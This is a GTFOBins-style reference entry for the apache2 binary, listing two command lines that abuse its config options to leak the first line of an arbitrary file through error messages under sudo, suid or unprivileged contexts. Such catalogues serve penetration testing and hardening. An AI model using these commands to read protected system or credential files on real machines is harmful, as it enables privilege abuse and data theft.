---
type: gtfobin
name: apache2
platform: Unix
functions: [file-read]
tags: [gtfobin, unix, lotl]
---

# apache2

## file-read

```bash
apache2 -f /path/to/input-file
```
_The first line may be leaked as an error message._
**Contexts:** sudo, suid, unprivileged

```bash
apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
```
_The first line may be leaked as an error message._
**Contexts:** sudo, suid, unprivileged
